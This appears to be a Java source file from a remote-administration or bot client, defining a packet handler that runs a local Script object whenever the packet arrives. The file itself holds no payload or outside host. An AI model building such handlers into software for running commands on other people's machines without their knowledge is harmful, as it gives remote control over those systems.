package com.redpois0n.packets;

import com.redpois0n.Script;

public class PacketSCRIPT extends Packet {

	@Override
	public void read(String line) throws Exception {
		new Script().perform();
	}

}
